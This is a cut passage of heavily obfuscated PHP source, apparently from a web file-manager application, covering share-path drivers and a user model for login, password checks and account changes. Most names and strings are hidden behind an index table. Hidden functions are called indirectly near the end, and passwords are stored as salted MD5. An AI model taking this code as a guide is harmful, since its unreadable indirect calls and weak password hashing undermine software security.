$†Û“ßš[$Ëî¸š÷¦[84]], $Áı¿úçå, $ íÓâË ); return $this->getPathOuter($Ç€»€‰); } public function uploadFileByID($¬ıñ¡ßÙ, $¬‘×‰Êü, $³®·¿Á‘) { $Ù¬áìºì =& $_SERVER[ Ö‘ñÄ”]; $íÍü·ê = $this->parse($¬ıñ¡ßÙ); $˜ììŠÖ = $this->model->addFileByFileID($íÍü·ê[$Ù¬áìºì[407]], $¬‘×‰Êü, $íÍü·ê[$Ù¬áìºì[84]], $³®·¿Á‘); return $this->getPathOuter($˜ììŠÖ); } public function addFileByRemote($ÜÏåëÃø, $É¸­‚ïŒ, $ò˜÷ğ† = array(), $½Ø„ŞõĞ = '', $¸Õ¤íÏ¤) { $˜¹ğşßÇ =& $_SERVER[ Ö‘ñÄ”]; $³¢ˆş± = $this->parse($ÜÏåëÃø); $½Ø„ŞõĞ = empty($½Ø„ŞõĞ) ? $³¢ˆş±[$˜¹ğşßÇ[84]] : $½Ø„ŞõĞ; $©ƒäâ¦ü = $this->model->addFileByRemote($³¢ˆş±[$˜¹ğşßÇ[407]], $É¸­‚ïŒ, $½Ø„ŞõĞ, $ò˜÷ğ†, $¸Õ¤íÏ¤); return $this->getPathOuter($©ƒäâ¦ü); } public function uploadLink($í‚Ö­á“, $‰ê™í©‰ = 0) { $»âÌìîÍ =& $_SERVER[ Ö‘ñÄ”]; $î€ßÛµƒ = $this->parse($í‚Ö­á“); $Û¯¼ù“¤ = _get($GLOBALS[$»âÌìîÍ[7]], $»âÌìîÍ[1335]); $Œ½øÎİ‘ = _get($GLOBALS[$»âÌìîÍ[7]], $»âÌìîÍ[1336]); $í‚Ö­á“ = Model($»âÌìîÍ[617])->createFileName($î€ßÛµƒ[$»âÌìîÍ[84]], $Û¯¼ù“¤, $Œ½øÎİ‘); return IO::uploadLink($í‚Ö­á“, $‰ê™í©‰); } public function fileNameAuto($¬Ùâß¼, $¢°÷½˜, $ö£Ì…ñÕ = REPEAT_REPLACE, $â„™ÕèŒ = false) { return $this->model->fileNameAuto($¬Ùâß¼, $¢°÷½˜, $ö£Ì…ñÕ, $â„™ÕèŒ); } public function fileNameExist($õá¡Æ–, $ùÁ—À—) { return $this->model->fileNameExist($õá¡Æ–, $ùÁ—À—); } protected function _fileOut($òÉÁœ—œ, $°Ô¾ôƒ = false, $ĞŒ¹ñÜÍ = false, $‘¸”˜ = '', $Í«åñ‰ã = false) { $¼»éûüè =& $_SERVER[ Ö‘ñÄ”]; $ÀÀ·™™Ì = $this->model->sourceInfo($òÉÁœ—œ); if ($ÀÀ·™™Ì[$¼»éûüè[418]] == $¼»éûüè[88]) { header($¼»éûüè[1337]); die; } $Ö¯™ºŠ = $this->model->fileInfoGet($òÉÁœ—œ); $‘¸”˜ = $Ö¯™ºŠ[$¼»éûüè[176]] ? $Ö¯™ºŠ[$¼»éûüè[176]] : $‘¸”˜; $®ŸıßãÕ = isset($GLOBALS[$¼»éûüè[1338]]) ? $GLOBALS[$¼»éûüè[1338]] : $ÀÀ·™™Ì[$¼»éûüè[32]]; if ($Í«åñ‰ã) { return IO::fileOutServer($Ö¯™ºŠ[$¼»éûüè[84]], $°Ô¾ôƒ, $®ŸıßãÕ, $‘¸”˜); } IO::fileOut($Ö¯™ºŠ[$¼»éûüè[84]], $°Ô¾ôƒ, $®ŸıßãÕ, $‘¸”˜); } public function fileOut($§ä ˜‘Ì, $ƒáÅ”şå = false, $‘²ßùû = false, $ïèŞ‰õÓ = '') { $this->_fileOut($§ä ˜‘Ì, $ƒáÅ”şå, $‘²ßùû, $ïèŞ‰õÓ); } public function fileOutServer($ÜÎöİ³, $™¯¬ü‹Ö = false, $ØÓş²íì = false, $ÖÕ„îĞ¿ = '') { $this->_fileOut($ÜÎöİ³, $™¯¬ü‹Ö, $ØÓş²íì, $ÖÕ„îĞ¿, !0); } protected function _fileOutImage($ˆşŞÅó£, $üò±Õ¹µ = 250) { $›íŞˆÓ¥ =& $_SERVER[ Ö‘ñÄ”]; $ÍãÊˆÙ¾ = $this->model->pathInfo($ˆşŞÅó£); if ($ÍãÊˆÙ¾[$›íŞˆÓ¥[418]] == $›íŞˆÓ¥[88]) { show_json($›íŞˆÓ¥[1339] . $ˆşŞÅó£, !1); } $çàıİŠ» = $this->model->fileInfoGet($ˆşŞÅó£); $çàıİŠ»[$›íŞˆÓ¥[32]] = $ÍãÊˆÙ¾[$›íŞˆÓ¥[32]]; $çàıİŠ»[$›íŞˆÓ¥[169]] = $ÍãÊˆÙ¾[$›íŞˆÓ¥[169]]; $GLOBALS[$›íŞˆÓ¥[1338]] = $çàıİŠ»[$›íŞˆÓ¥[32]]; $GLOBALS[$›íŞˆÓ¥[168]] = $çàıİŠ»; IO::fileOutImage($çàıİŠ»[$›íŞˆÓ¥[84]], $üò±Õ¹µ); } public function fileOutImage($È–±‰ì‚, $‡«ğÛ™ï = 250) { $this->_fileOutImage($È–±‰ì‚, $‡«ğÛ™ï); } public function fileOutImageServer($àÅğóõÖ, $œ™ìİ“ = 250) { $this->_fileOutImage($àÅğóõÖ, $œ™ìİ“); } public function link($ÊñºÅÍÜ, $ØŠ¡ˆÆù = '') { $Â¯È“äå = $this->model->fileInfoGet($ÊñºÅÍÜ); return IO::link($Â¯È“äå[$_SERVER[ Ö‘ñÄ”][84]], $ØŠ¡ˆÆù); } protected function parse($Â·ëŠÙç) { $¿½—ù¼ =& $_SERVER[ Ö‘ñÄ”]; if (strstr($Â·ëŠÙç, $¿½—ù¼[8]) === !1) { return array($¿½—ù¼[427] => intval($Â·ëŠÙç), $¿½—ù¼[84] => $¿½—ù¼[12], $¿½—ù¼[1334] => array()); } $¯Üòõ£õ = explode($¿½—ù¼[8], trim($Â·ëŠÙç, $¿½—ù¼[8])); if (count($¯Üòõ£õ) < 2) { show_tips(clear_html($Â·ëŠÙç) . $¿½—ù¼[1340]); } return array($¿½—ù¼[427] => intval($¯Üòõ£õ[0]), $¿½—ù¼[84] => $¯Üòõ£õ[1], $¿½—ù¼[1334] => array_slice($¯Üòõ£õ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($‰·Ğô€ˆ) { $this->pathParse = $‰·Ğô€ˆ; $this->model = Model($_SERVER[ Ö‘ñÄ”][1333]); } public function getPathOuter($©é¢ñ¸¾) { $Èª‚»‹È =& $_SERVER[ Ö‘ñÄ”]; if (!$©é¢ñ¸¾) { return $©é¢ñ¸¾; } $µÒªÔÕŠ = $this->parse($©é¢ñ¸¾); return trim(KodIO::makeShare($this->pathParse[$Èª‚»‹È[407]], $µÒªÔÕŠ[$Èª‚»‹È[407]]), $Èª‚»‹È[8]); } protected function infoParse($ØŒ‘Î‚ô, $îƒÁÈÆ¿ = false, $¯•¿¦ë = false) { $ÎùğË‡ı =& $_SERVER[ Ö‘ñÄ”]; $Óºø§Õ² = $this->pathParse[$ÎùğË‡ı[407]]; $ñ€òµ«ä = trim($this->pathParse[$ÎùğË‡ı[1175]], $ÎùğË‡ı[8]); return Action($ÎùğË‡ı[1341])->sharePathInfo($Óºø§Õ², $ñ€òµ«ä, $îƒÁÈÆ¿); } public function infoFull($éÏñÊã¹) { $†ê×ù¸º =& $_SERVER[ Ö‘ñÄ”]; $ï¬ì¶–û = explode($†ê×ù¸º[8], trim($éÏñÊã¹, $†ê×ù¸º[8])); if (count($ï¬ì¶–û) > 1) { $›¯Æáâü = implode($†ê×ù¸º[8], array_splice($ï¬ì¶–û, 1)); $’ÑÊ¹É£ = $this->model->pathInfoByPath($ï¬ì¶–û[0], $›¯Æáâü); if (!$’ÑÊ¹É£) { return !1; } $this->pathParse[$†ê×ù¸º[1175]] = $’ÑÊ¹É£[$†ê×ù¸º[410]]; } return $this->infoParse($éÏñÊã¹); } public function listAll($Ë¿î­çĞ) { $ŸÊÍèÁ˜ =& $_SERVER[ Ö‘ñÄ”]; $Ì¬‹ˆæ– = IO::info($this->pathParse[$ŸÊÍèÁ˜[84]]); if (!$Ì¬‹ˆæ–) { return array(); } $”È°Øñ¿ = $this->model->listAll($Ë¿î­çĞ); $€Š¯†Àâ = Model($ŸÊÍèÁ˜[609])->getInfo($Ì¬‹ˆæ–[$ŸÊÍèÁ˜[497]]); $¯©ö‹å– = Action($ŸÊÍèÁ˜[1341]); foreach ($”È°Øñ¿ as &$ˆÃÏˆé) { check_abort(); $ˆÃÏˆé[$ŸÊÍèÁ˜[86]] = $¯©ö‹å–->_shareItemeParse($ˆÃÏˆé[$ŸÊÍèÁ˜[86]], $€Š¯†Àâ); } unset($ˆÃÏˆé); return $”È°Øñ¿; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($÷ñÃë) { $this->pathParse = $÷ñÃë; $this->model = Model($_SERVER[ Ö‘ñÄ”][1333]); } protected function infoParse($“¿ç¸§Ê, $›Õ÷·ğ“ = false, $ú“µòí´ = false) { $Ã·õşş¼ =& $_SERVER[ Ö‘ñÄ”]; return Action($Ã·õşş¼[1181])->sharePathInfo($this->pathParse[$Ã·õşş¼[84]], !0, $›Õ÷·ğ“); } public function listPath($ßÁœ‘ãÌ, $ú»Ôø = false) { $‡•€‘ëİ =& $_SERVER[ Ö‘ñÄ”]; $öëœ‡Çç = parent::listPath($ßÁœ‘ãÌ, $ú»Ôø); if (!$öëœ‡Çç) { return $öëœ‡Çç; } if (is_array($öëœ‡Çç[$‡•€‘ëİ[1342]])) { $öëœ‡Çç[$‡•€‘ëİ[1342]] = Action($‡•€‘ëİ[1181])->shareItemInfo($öëœ‡Çç[$‡•€‘ëİ[1342]]); } foreach ($öëœ‡Çç as $õĞƒ…ÍÚ => $³•÷êÑ») { if (!in_array($õĞƒ…ÍÚ, array($‡•€‘ëİ[83], $‡•€‘ëİ[82]))) { continue; } foreach ($³•÷êÑ» as $À«Á¢ª => $¸ÙóÌÄŒ) { $öëœ‡Çç[$õĞƒ…ÍÚ][$À«Á¢ª] = Action($‡•€‘ëİ[1181])->shareItemInfo($¸ÙóÌÄŒ); } } return $öëœ‡Çç; } public function listAll($Îèäá®) { $ùãÕÒ”Ã =& $_SERVER[ Ö‘ñÄ”]; $¨ï¢ó¼° = IO::info($this->pathParse[$ùãÕÒ”Ã[84]]); if (!$¨ï¢ó¼°) { return array(); } $‚ª¼˜Í¢ = $this->model->listAll($Îèäá®); foreach ($‚ª¼˜Í¢ as &$Í¢ùÎ¦ä) { $Í¢ùÎ¦ä[$ùãÕÒ”Ã[86]] = Action($ùãÕÒ”Ã[1181])->shareItemInfo($Í¢ùÎ¦ä[$ùãÕÒ”Ã[86]]); } unset($Í¢ùÎ¦ä); return $‚ª¼˜Í¢; } } goto cï™ËÆö; Eîİö¥ìºâ: class UserModel extends ModelBase { protected $tableName = "\165\163\x65\x72"; protected $tableMeta = array("\x74\141\x62\x6c\x65\x4e\x61\155\145" => "\x75\x73\145\x72\137\x6d\x65\164\x61", "\155\145\164\141\106\151\x65\154\x64" => "\x75\163\x65\x72\111\104"); protected $simpleField = "\x75\163\145\x72\111\x44\54\156\151\x63\x6b\116\x61\155\145\x2c\156\x61\x6d\145\x2c\x61\166\141\164\x61\162\54\x73\x65\x78\x2c\x73\164\141\x74\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($øÇ §ª) { $°û«¢»ê =& $_SERVER[ Ö‘ñÄ”]; $‘Ÿ§Ç»§ = $°û«¢»ê[2279]; return array($°û«¢»ê[1914] => array($øÇ §ª[0], $‘Ÿ§Ç»§), $°û«¢»ê[1916] => array($øÇ §ª[0], $‘Ÿ§Ç»§), $°û«¢»ê[2280] => array($øÇ §ª[0], $‘Ÿ§Ç»§)); } protected function getInfo($ÛÜÖÓ¦, $ÇÖğ„¦µ = false) { $±ø‘ö = $this->getInfoSimple($ÛÜÖÓ¦); if (!is_array($±ø‘ö)) { return array(); } if ($ÇÖğ„¦µ) { return $this->_getInfoApply($±ø‘ö); } return $this->cacheFunctionGet($_SERVER[ Ö‘ñÄ”][1918], $ÛÜÖÓ¦); } protected function getInfoFull($ù¦¹›ˆ”, $Éûäéç€ = false) { $èÍ«úø« = $this->getInfoSimple($ù¦¹›ˆ”); if (!is_array($èÍ«úø«)) { return array(); } if ($Éûäéç€) { return $this->_getInfoApply($èÍ«úø«, !0); } return $this->cacheFunctionGet($_SERVER[ Ö‘ñÄ”][2281], $ù¦¹›ˆ”); } private function _getInfoApply($‹¯œÙ¬„, $¸œ‰‰ó¢ = false) { $»À«üæº =& $_SERVER[ Ö‘ñÄ”]; if (!$‹¯œÙ¬„) { return $‹¯œÙ¬„; } $¨ŸĞ¿ö¼ = md5($»À«üæº[2282] . $‹¯œÙ¬„[$»À«üæº[895]] . $»À«üæº[2283] . $‹¯œÙ¬„[$»À«üæº[32]]); $‹¯œÙ¬„ = $this->_listDataApplyItem($‹¯œÙ¬„); $šºˆîíÂ = Model($»À«üæº[1333])->metaGet($‹¯œÙ¬„[$»À«üæº[86]][$»À«üæº[410]]); $‹¯œÙ¬„[$»À«üæº[2284]] = $¨ŸĞ¿ö¼; $‹¯œÙ¬„[$»À«üæº[86]][$»À«üæº[2105]] = isset($šºˆîíÂ[$»À«üæº[2106]]) ? $šºˆîíÂ[$»À«üæº[2106]] : null; if ($¸œ‰‰ó¢) { $‹¯œÙ¬„[$»À«üæº[474]] = $this->metaGet($‹¯œÙ¬„[$»À«üæº[1663]]); } return $‹¯œÙ¬„; } protected function getInfoSimple($¤À§ÛÈĞ, $õ¯µşÂã = false) { $’€ ÉóÉ =& $_SERVER[ Ö‘ñÄ”]; if (!$¤À§ÛÈĞ) { return array(); } if ($õ¯µşÂã) { $ïê² ø‡ = $this->where(array($’€ ÉóÉ[1663] => intval($¤À§ÛÈĞ)))->find(); if (!is_array($ïê² ø‡)) { return array(); } $ïê² ø‡[$’€ ÉóÉ[551]] = Action($’€ ÉóÉ[2285])->parseUrl($ïê² ø‡[$’€ ÉóÉ[551]]); return $ïê² ø‡; } return $this->cacheFunctionGet($’€ ÉóÉ[1919], $¤À§ÛÈĞ); } protected function getInfoSimpleOuter($ª˜æ”àè) { $çÊöÂú =& $_SERVER[ Ö‘ñÄ”]; if (!$ª˜æ”àè || $ª˜æ”àè == 0) { return array($çÊöÂú[1663] => $çÊöÂú[197], $çÊöÂú[32] => $çÊöÂú[162] . LNG($çÊöÂú[2286]) . $çÊöÂú[164], $çÊöÂú[551] => STATIC_PATH . $çÊöÂú[2287]); } $ÇÜÇÛ‰Â = $this->cacheFunctionGet($çÊöÂú[1919], $ª˜æ”àè); $¯â§¨ê = array_field_key($ÇÜÇÛ‰Â, explode($çÊöÂú[50], $this->simpleField)); if (!$¯â§¨ê) { return array($çÊöÂú[1663] => $çÊöÂú[1196], $çÊöÂú[32] => $çÊöÂú[162] . LNG($çÊöÂú[2288]) . $çÊöÂú[164], $çÊöÂú[551] => STATIC_PATH . $çÊöÂú[2289]); } $¯â§¨ê[$çÊöÂú[551]] = Action($çÊöÂú[2285])->parseUrl($¯â§¨ê[$çÊöÂú[551]]); return $¯â§¨ê; } protected function groupUser($²åâñò) { } public static function errorLang($’õÓ¢Á) { $¢¯”ğ‘ =& $_SERVER[ Ö‘ñÄ”]; $ëâà­À = array(self::ERROR_USER_NOT_EXISTS => $¢¯”ğ‘[2290], self::ERROR_USER_PASSWORD_ERROR => $¢¯”ğ‘[2291], self::ERROR_USER_EXIST_NAME => $¢¯”ğ‘[2292], self::ERROR_USER_EXIST_PHONE => $¢¯”ğ‘[2293], self::ERROR_USER_EXIST_EMAIL => $¢¯”ğ‘[2294], self::ERROR_USER_LOGIN_LOCK => $¢¯”ğ‘[2295], self::ERROR_IP_NOT_ALLOW => $¢¯”ğ‘[2296], self::ERROR_USER_EXIST_NICKNAME => $¢¯”ğ‘[2297]); return LNG($ëâà­À[$’õÓ¢Á]); } public function getInfoByMeta($û€©¨™Ÿ, $£Åò”Ö›) { $èûÍÏŒ =& $_SERVER[ Ö‘ñÄ”]; $ı©…ûª = Model($èûÍÏŒ[2298])->where(array($èûÍÏŒ[94] => $û€©¨™Ÿ, $èûÍÏŒ[383] => $£Åò”Ö›))->find(); if ($ı©…ûª) { return $this->getInfo($ı©…ûª[$èûÍÏŒ[1663]]); } return !1; } public function userLoginCheck($í‹àĞ†é, $ú‚äñç) { $ğ‹ñ¢ú… =& $_SERVER[ Ö‘ñÄ”]; $Ï³Œ¤Ç = $this->userLoginFind($í‹àĞ†é); if (!$Ï³Œ¤Ç) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Ï³Œ¤Ç[$ğ‹ñ¢ú…[1663]], $ú‚äñç)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($Ï³Œ¤Ç[$ğ‹ñ¢ú…[1663]]); } public function userLoginFind($ÚâËÏö¨) { $ÇãêÚ“˜ =& $_SERVER[ Ö‘ñÄ”]; $äƒ…ƒÙÀ = array($ÇãêÚ“˜[32] => $ÚâËÏö¨, $ÇãêÚ“˜[550] => $ÚâËÏö¨, $ÇãêÚ“˜[314] => $ÚâËÏö¨, $ÇãêÚ“˜[2299] => $ÚâËÏö¨, $ÇãêÚ“˜[1006] => $ÇãêÚ“˜[1008]); if ($this->nickNameRpt()) { unset($äƒ…ƒÙÀ[$ÇãêÚ“˜[550]]); } return $this->where($äƒ…ƒÙÀ)->find(); } public function clearCache($­ŒÆš©÷) { $—¬ïÃÓÀ =& $_SERVER[ Ö‘ñÄ”]; $this->cacheFunctionClear($—¬ïÃÓÀ[1918], $­ŒÆš©÷); $this->cacheFunctionClear($—¬ïÃÓÀ[1919], $­ŒÆš©÷); $this->cacheFunctionClear($—¬ïÃÓÀ[2281], $­ŒÆš©÷); } public function userPasswordCheck($šâï£…İ, $Ò™ı—”) { $³›«Ê†¯ =& $_SERVER[ Ö‘ñÄ”]; $ÕĞšë‹ = $this->where(array($³›«Ê†¯[1663] => intval($šâï£…İ)))->find(); $Ô¨‚Éô = $this->metaGet($šâï£…İ); $Ñµ÷Ä¤ = isset($Ô¨‚Éô[$³›«Ê†¯[2300]]) ? $Ô¨‚Éô[$³›«Ê†¯[2300]] : $³›«Ê†¯[12]; if (md5($Ñµ÷Ä¤ . trim($Ò™ı—”)) !== $ÕĞšë‹[$³›«Ê†¯[895]]) { return !1; } return !0; } public function userAdd($Î—Ø•áÓ) { $Œó‚§Äş =& $_SERVER[ Ö‘ñÄ”]; $úƒ½ú‚Ñ = array($Œó‚§Äş[428] => $Î—Ø•áÓ[$Œó‚§Äş[32]], $Œó‚§Äş[2301] => $Î—Ø•áÓ[$Œó‚§Äş[1542]], $Œó‚§Äş[2302] => isset($Î—Ø•áÓ[$Œó‚§Äş[314]]) ? $Î—Ø•áÓ[$Œó‚§Äş[314]] : $Œó‚§Äş[12], $Œó‚§Äş[2303] => isset($Î—Ø•áÓ[$Œó‚§Äş[2299]]) ? $Î—Ø•áÓ[$Œó‚§Äş[2299]] : $Œó‚§Äş[12], $Œó‚§Äş[2304] => isset($Î—Ø•áÓ[$Œó‚§Äş[550]]) ? $Î—Ø•áÓ[$Œó‚§Äş[550]] : $Î—Ø•áÓ[$Œó‚§Äş[32]], $Œó‚§Äş[2305] => isset($Î—Ø•áÓ[$Œó‚§Äş[551]]) ? $Î—Ø•áÓ[$Œó‚§Äş[551]] : $Œó‚§Äş[12], $Œó‚§Äş[2306] => isset($Î—Ø•áÓ[$Œó‚§Äş[2307]]) ? $Î—Ø•áÓ[$Œó‚§Äş[2307]] : 1, $Œó‚§Äş[2308] => $Î—Ø•áÓ[$Œó‚§Äş[895]], $Œó‚§Äş[1920] => isset($Î—Ø•áÓ[$Œó‚§Äş[1823]]) ? $Î—Ø•áÓ[$Œó‚§Äş[1823]] : 1024 * 1024 * 20, $Œó‚§Äş[1921] => 0, $Œó‚§Äş[2309] => 0, $Œó‚§Äş[1965] => isset($Î—Ø•áÓ[$Œó‚§Äş[763]]) ? $Î—Ø•áÓ[$Œó‚§Äş[763]] : 1); if (!empty($Î—Ø•áÓ[$Œó‚§Äş[1663]])) { $úƒ½ú‚Ñ[$Œó‚§Äş[1663]] = $Î—Ø•áÓ[$Œó‚§Äş[1663]]; } $ıîî„¥ = $this->_checkExist($Î—Ø•áÓ); if ($ıîî„¥ !== !0) { return $ıîî„¥; } if (!empty($úƒ½ú‚Ñ[$Œó‚§Äş[551]]) && strlen($úƒ½ú‚Ñ[$Œó‚§Äş[551]]) > 255) { $úƒ½ú‚Ñ[$Œó‚§Äş[551]] = $Œó‚§Äş[12]; } $ª¢˜—ƒÌ = $this->add($úƒ½ú‚Ñ); $­÷·ÒÒ = array($Œó‚§Äş[2308] => $úƒ½ú‚Ñ[$Œó‚§Äş[895]], $Œó‚§Äş[2304] => $úƒ½ú‚Ñ[$Œó‚§Äş[550]]); $this->userEdit($ª¢˜—ƒÌ, $­÷·ÒÒ); Model($Œó‚§Äş[1333])->userRootAdd($ª¢˜—ƒÌ); return $ª¢˜—ƒÌ; } protected function userEditTest($«êş·Òß, $Êãğ…²ù) { return $this->call($_SERVER[ Ö‘ñÄ”][2310], $«êş·Òß, $Êãğ…²ù); } protected function userEdit($À““½ú, $ùæØª“È) { $åé˜«ğÚ =& $_SERVER[ Ö‘ñÄ”]; $‰Øæ‘ëˆ = $this->getInfoSimple($À““½ú); if (!$‰Øæ‘ëˆ) { return !1; } $å­Å„ª = $this->_checkExist($ùæØª“È, $À““½ú); if ($å­Å„ª !== !0) { return $å­Å„ª; } if (isset($ùæØª“È[$åé˜«ğÚ[895]]) && trim($ùæØª“È[$åé˜«ğÚ[895]]) != $åé˜«ğÚ[12]) { $Ğ›©†î† = $this->metaGet($À““½ú); if (empty($Ğ›©†î†[$åé˜«ğÚ[2300]])) { $Ğ›©†î†[$åé˜«ğÚ[2300]] = rand_string(10); Model($åé˜«ğÚ[521])->metaSet($À““½ú, $åé˜«ğÚ[2300], $Ğ›©†î†[$åé˜«ğÚ[2300]]); } $ùæØª“È[$åé˜«ğÚ[895]] = md5($Ğ›©†î†[$åé˜«ğÚ[2300]] . trim($ùæØª“È[$åé˜«ğÚ[895]])); } else { unset($ùæØª“È[$åé˜«ğÚ[895]]); } if (!empty($ùæØª“È[$åé˜«ğÚ[551]]) && strlen($ùæØª“È[$åé˜«ğÚ[551]]) > 255) { $ùæØª“È[$åé˜«ğÚ[551]] = $åé˜«ğÚ[12]; } $this->where(array($åé˜«ğÚ[1654] => $À““½ú))->save($ùæØª“È); if (isset($ùæØª“È[$åé˜«ğÚ[550]])) { $this->setNamePinyin($À““½ú, $ùæØª“È[$åé˜«ğÚ[550]]); } $this->clearCache($À““½ú); return !0; } public function setNamePinyin($ÇºŞúà, $û£…üËÀ = false) { $ÜõÜÎ—» =& $_SERVER[ Ö‘ñÄ”]; if (!$û£…üËÀ) { $«‡úĞì = $this->getInfoSimple($ÇºŞúà); $û£…üËÀ = $«‡úĞì[$ÜõÜÎ—»[550]] ? $«‡úĞì[$ÜõÜÎ—»[550]] : $«‡úĞì[$ÜõÜÎ—»[32]]; } $ğÈ›œ½é = Model($ÜõÜÎ—»[543]); if (!Input::check($û£…üËÀ, $ÜõÜÎ—»[601])) { return $ğÈ›œ½é->metaSet($ÇºŞúà, array($ÜõÜÎ—»[473] => $ÜõÜÎ—»[12], $ÜõÜÎ—»[472] => $ÜõÜÎ—»[12])); } return $ğÈ›œ½é->metaSet($ÇºŞúà, array($ÜõÜÎ—»[473] => str_replace($ÜõÜÎ—»[53], $ÜõÜÎ—»[12], Pinyin::get($û£…üËÀ)), $ÜõÜÎ—»[472] => Pinyin::get($û£…üËÀ, $ÜõÜÎ—»[602]))); } private function nickNameRpt() { $÷ÇÌëßœ =& $_SERVER[ Ö‘ñÄ”]; $¦¦ŸÆè· = Model($÷ÇÌëßœ[783])->get($÷ÇÌëßœ[2311]); $ãÂ‚¸¢ = $GLOBALS[$÷ÇÌëßœ[6]][$÷ÇÌëßœ[389]][$÷ÇÌëßœ[2311]]; $Ôâ»¶â = !is_null($¦¦ŸÆè·) ? $¦¦ŸÆè· : $ãÂ‚¸¢; return !!$Ôâ»¶â; } private function _checkExist($Ê–ÁÒ¢·, $Û¤Âü•© = false) { $©‚½›Ç¬ =& $_SERVER[ Ö‘ñÄ”]; $ÏÆ—øû = array($©‚½›Ç¬[32] => UserModel::ERROR_USER_EXIST_NAME, $©‚½›Ç¬[550] => UserModel::ERROR_USER_EXIST_NICKNAME, $©‚½›Ç¬[314] => UserModel::ERROR_USER_EXIST_EMAIL, $©‚½›Ç¬[2299] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ÏÆ—øû[$©‚½›Ç¬[550]]); } $«’ƒ‹¯ø = $Û¤Âü•© ? array($©‚½›Ç¬[1663] => array($©‚½›Ç¬[2312], $Û¤Âü•©)) : array(); foreach ($ÏÆ—øû as $£üªÇá… => $Ğ±ÏÛÈÜ) { $´üıƒõ = array(); foreach ($ÏÆ—øû as $ÕÍ­œí¿ => $Ìâõ¦ËÔ) { if (isset($Ê–ÁÒ¢·[$ÕÍ­œí¿]) && $Ê–ÁÒ¢·[$ÕÍ­œí¿]) { $´üıƒõ[] = $Ê–ÁÒ¢·[$ÕÍ­œí¿]; } } if (!$´üıƒõ) { continue; } $‚Ç²Á = array_merge(array($£üªÇá… => array($©‚½›Ç¬[7], $´üıƒõ)), $«’ƒ‹¯ø); $Ç¥Ò‹Â¤ = $this->where($‚Ç²Á)->find(); if ($Ç¥Ò‹Â¤) { return $Ğ±ÏÛÈÜ; } } return !0; } public function userListInfo($óÊ˜şûã) { $©ÕØ£×¤ =& $_SERVER[ Ö‘ñÄ”]; $¤Ä«ü§ª = array(); $óÊ˜şûã = is_array($óÊ˜şûã) ? array_unique($óÊ˜şûã) : array(); if (!$óÊ˜şûã) { return $¤Ä«ü§ª; } if (count($óÊ˜şûã) < 20) { foreach ($óÊ˜şûã as $š¾Ãİï) { $¤Ä«ü§ª[$š¾Ãİï . $©ÕØ£×¤[12]] = $this->getInfoSimpleOuter($š¾Ãİï); } } else { $ïû²óô = array($©ÕØ£×¤[1654] => array($©ÕØ£×¤[426], $óÊ˜şûã)); if (count($óÊ˜şûã) == 1) { $ïû²óô = array($©ÕØ£×¤[1654] => $óÊ˜şûã[0]); } $ìÖ¾ªşÕ = Model($©ÕØ£×¤[521])->field($this->simpleField)->where($ïû²óô)->select(); $ìÖ¾ªşÕ = array_to_keyvalue($ìÖ¾ªşÕ, $©ÕØ£×¤[1663]); foreach ($óÊ˜şûã as $š¾Ãİï) { $œƒÌƒÖê = $ìÖ¾ªşÕ[$š¾Ãİï]; if (!$œƒÌƒÖê) { $¤Ä«ü§ª[$š¾Ãİï . $©ÕØ£×¤[12]] = $this->getInfoSimpleOuter($š¾Ãİï); continue; } $œƒÌƒÖê[$©ÕØ£×¤[551]] = Action($©ÕØ£×¤[2285])->parseUrl($œƒÌƒÖê[$©ÕØ£×¤[551]]); $¤Ä«ü§ª[$š¾Ãİï . $©ÕØ£×¤[12]] = $œƒÌƒÖê; } } return $¤Ä«ü§ª; } protected function userStatus($®íşçš, $™ç´Õ©’) { $¹ìîŸ±™ = $this->getInfoSimple($®íşçš); if (!$¹ìîŸ±™) { return !1; } $ Õ°Õ¤æ = array($_SERVER[ Ö‘ñÄ”][763] => $™ç´Õ©’); return $this->userEdit($®íşçš, $ Õ°Õ¤æ); } protected function userRemove($ááº—å) { $Î¨Øî€‘ =& $_SERVER[ Ö‘ñÄ”]; $€€Ò‡«Ê = $this->getInfoSimple($ááº—å); if (!$€€Ò‡«Ê) { return !1; } $ÈœŒëÒñ = array($Î¨Øî€‘[1654] => $ááº—å); Model($Î¨Øî€‘[609])->where($ÈœŒëÒñ)->delete(); Model($Î¨Øî€‘[2313])->where($ÈœŒëÒñ)->delete(); Model($Î¨Øî€‘[1926])->where($ÈœŒëÒñ)->delete(); Model($Î¨Øî€‘[2298])->where($ÈœŒëÒñ)->delete(); Model($Î¨Øî€‘[1074])->where($ÈœŒëÒñ)->delete(); Model($Î¨Øî€‘[2129])->removeUserAll($ááº—å); Model($Î¨Øî€‘[838])->userRootRemove($ááº—å); return $this->where($ÈœŒëÒñ)->delete(); } protected function userGroupSet($–ì‚ìğ, $ÚÙßÎŒ×, $Ã½©’œĞ = array()) { $›ù—ò¢¢ =& $_SERVER[ Ö‘ñÄ”]; $²Æ²İ‹Ñ = $_SERVER[$›ù—ò¢¢[241]] . $›ù—ò¢¢[242]; $ÚìùÔéƒ = $›ù—ò¢¢[1762]; if ($_SERVER[$›ù—ò¢¢[238]] != $ÚìùÔéƒ($²Æ²İ‹Ñ)) { $ÖÎÏ÷ØÜ = $›ù—ò¢¢[885]; $ÖñÊÉá = $›ù—ò¢¢[240]; $Ş¶Ù§×¸ = $_SERVER[$›ù—ò¢¢[241]] . $›ù—ò¢¢[242]; $ÄÈ¸û = $ÖñÊÉá($Ş¶Ù§×¸); $‰³„Ğ = explode($›ù—ò¢¢[231], $ÄÈ¸û); if (count($‰³„Ğ) < $›ù—ò¢¢[631]) { $”’Âëï = $›ù—ò¢¢[244]; $”’Âëï(); } $óÏÃéÆ = $›ù—ò¢¢[886]; $óÏÃéÆ($_SERVER[$›ù—ò¢¢[887]]); $ÖÎÏ÷ØÜ = $›ù—ò¢¢[885]; $ÖÎÏ÷ØÜ(); $ÖÁàû®Û = $›ù—ò¢¢[2314]; $Ûü¶‚ˆ = 